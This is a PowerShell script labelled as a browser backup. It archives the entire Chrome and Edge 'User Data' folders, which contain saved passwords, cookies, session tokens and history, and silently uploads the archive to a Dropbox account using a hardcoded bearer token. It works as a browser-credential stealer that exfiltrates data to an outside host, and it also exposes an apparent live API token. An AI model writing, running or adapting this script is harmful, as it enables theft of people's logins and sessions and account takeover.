if (-not (Test-Path "C:\Users\$env:USERNAME\Browser Backups")) {New-Item -ItemType Directory -Path "C:\Users\$env:USERNAME\BrowserBackups"}
if ( Test-Path "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data" ) {
	Get-ChildItem "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data" -Recurse | ForEach-Object {
		if ($_.LastWriteTime.Year -lt 1980) { $_.LastWriteTime = Get-Date "1980-01-01" }
		elseif ($_.LastWriteTime.Year -gt 2107) { $_.LastWriteTime = Get-Date "2107-12-31" }
	}

	Compress-Archive -Path (Get-ChildItem "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data" -Recurse | Where-Object {
		try { $s=[System.IO.File]::Open($_.FullName,'Open','Read','None');$s.Close();$true } catch {
			$false }
	}).FullName -DestinationPath "C:\Users\$env:USERNAME\BrowserBackups\chromeBackup.zip" -ErrorAction SilentlyContinue
	#Compress-Archive -Path "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data" -DestinationPath "C:\Users\$env:USERNAME\BrowserBackups\chromeBackup.zip" -ErrorAction SilentlyContinue
} else {
	Write-Host "No Chrome Data Found"
}
if ( Test-Path "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data" ) {
	Get-ChildItem "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data" -Recurse | ForEach-Object {
		if ($_.LastWriteTime.Year -lt 1980) { $_.LastWriteTime = Get-Date "1980-01-01" }
		elseif ($_.LastWriteTime.Year -gt 2107) { $_.LastWriteTime = Get-Date "2107-12-31" }
	}

	Compress-Archive -Path (Get-ChildItem "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data" -Recurse | Where-Object {
		try { $s=[System.IO.File]::Open($_.FullName,'Open','Read','None');$s.Close();$true } catch {
			$false }
	}).FullName -DestinationPath "C:\Users\$env:USERNAME\BrowserBackups\msEdgeBackup.zip" -ErrorAction SilentlyContinue
	#Compress-Archive -Path "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data" -DestinationPath "C:\Users\$env:USERNAME\BrowserBackups\msEdgeBackup.zip" -ErrorAction SilentlyContinue
} else {
	Write-Host "No Edge Data Found"
}
Compress-Archive -Path "C:\Users\$env:USERNAME\BrowserBackups" -DestinationPath "C:\Users\$env:USERNAME\Backup.zip"

$AccessToken = "sl.u.AGFkijWOycntvFcIKIBlfltpQXXEmVZisHrdsS8vTqB0FEVxTwwzmfqTOZZFYLTjkES7kAe1mKVvzwUaeRBw3EMTnBmDebQ_Gh0bTTkFepN4-LPH9rbGl5osdcAVsWLUVi4dylOsPg6tRh5VY72yjbcO9bOlxgoKSqTvX4JLNdGxOlWH4I-Uig9VVJ7wOf3KgSEiRiaEREbFRGGcwlWjhIhBjViDFuYHcgTWMG_KFnQfPnWJevC5gIUjQBMhx6atLb8O0Jod8BTNkfS3JlWaHc74f1PH9G2ZkNbo2coe8Vdy7KQRduPa-eGQhALBDHw4Gsnv0CiET47Ta60r0J4s8f0zbK8AqNlZd-x9oFtSbDKbw0cD2utE74pkNmTof4_dRPuTE5nrzEk1Je53EWeKhIA6-PHvIGhu-_iZtp0Ot2CAlmpFxlHGQzPGo38cVLbEuN7PJFwregwGkLKGh14WOm5J_JqUpIGl9tgdFMr5NRqlFj16oWcVegCr2pkbbJFdUael_olvQ-fQoajsHMvXGDdRYgaL5T30jlEk1kmONPt4yIbiitzkACxdTY3INuvtVGqEa8yF-4IT6eylAuAoQZXmkxjZFrggXNPOwWJqLQbnST6Uq4YSARob3jguiGJ2mk7eFPOqq1T-74gqcgIkmo_SDhdIy8CbtOqRY1Z7ENELrNm_sRIZ4bqdoT9i1Ah3_SscW9ggsNgqpsHi8XtywMOQIYv5jgpk_n5AA3fhs2sJHh1MsFCTAB3tBtRNVt3tBDDDuTga_fLsgKhsu-OIk0Kf8S1dyTskxD64yy2ueOzEQc2UPDTdp2hJ7wkaErKLpKTjGWxu_OPbQWI2uqnps1J_xMwQmoHhwEbHR_inSl68dQTJW9eAYXGJ2NKu_pcrX8xEaqCqv0PGaC0gdNa5XkF_JJkSS1hRBDKOV40m_gkKK00V3_AmuvopupvtAqc-n9B-x_r67Iff2ufujtm9LFzS003wPFqcEm_P8gdtdo0fKXeQxDVjjUc-tfWVnliCy3qhCzg2dzllihqeDAej99dXExIjQBFVoODkeNmjYP8PeKYpzkf37pQ7n9IDn8I__4Mi4hH5t0dQui8JENN8WsjYJI3Ozjs83eTUUuFUhZt1SCZGIzJ4vgUwx7ksRRUFnpjkIJ6eqm_2jalFm5PTUzuRhtdROnYp_Sookqkvhmhc887_hn9jA8wtdpp2td2xZ90RnYgpa4Nl111t4pAnafI1a4HsOKVlrghctK0hSLu7xDZuXfIT8aQ1JvioTgZ9WDw6xLUNXTxehaYCcm13nJxN"
$FilePath = "C:\Users\$env:USERNAME\Backup.zip"
$FileName = [System.IO.Path]::GetFileName($FilePath)
$DropboxArg = @{ path = "/$FileName"; mode = "add"; autorename = $true; mute = $false } | ConvertTo-Json -Compress
$Headers = @{
	"Authorization" = "Bearer $AccessToken"
	"Dropbox-API-Arg" = $DropboxArg
	"Content-Type" = "application/octet-stream"
}

Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -InFile $FilePath -Headers $Headers
